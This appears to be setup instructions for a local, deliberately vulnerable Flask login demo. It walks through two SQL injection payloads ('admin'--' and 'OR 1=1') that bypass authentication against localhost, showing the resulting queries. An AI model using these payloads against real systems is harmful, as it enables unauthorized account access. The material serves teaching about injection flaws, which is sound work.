SQL Injection Demo Flask App

Step 1:-
        Make sure the following are installed on your system:
            -> Python 3.X
            -> Flask
                Install Via terminal
                >> pip install Flask

Step 2:-
        Save your code in a file, 
        eg: vuln_app.py

Step 3:-
        In your terminal, navigate to the folder where vuln_app.py is saved, then run:
        >> python vuln_app.py

        You should see output like:
        >> *Running on http://127.0.0.1.5000/

Step 4:-
        Open your web browser and go to:
        >>http://127.0.0.1:5000/login?username=admin&password=adminpass
        
        This will show:
        ✅ Login successful!
            Username: admin
            Password: adminpass

Step 5:-
        Test First Payload
        URL:-
                http://127.0.0.1:5000/login?username=admin'--&password=test
                
        This builds the SQL query:
                SELECT * FROM users WHERE username = 'admin'--' AND password = 'test'
        Result :-
            ✅ Login successful!
                Username: admin
                Password: adminpass

        Test Second Payload
        URL:-
                http://127.0.0.1:5000/login?username=admin' OR '1'='1&password=test

        This becomes:-
                SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'test'
        Result :-
            ✅ Login successful!
                Username: admin
                Password: adminpass

Step 6:-
        If you mess up the database, just stop the server and restart it:
        >> python vuln_app.py

        This will recreate the example.db with a fresh user:
            Username: admin  
            Password: adminpass



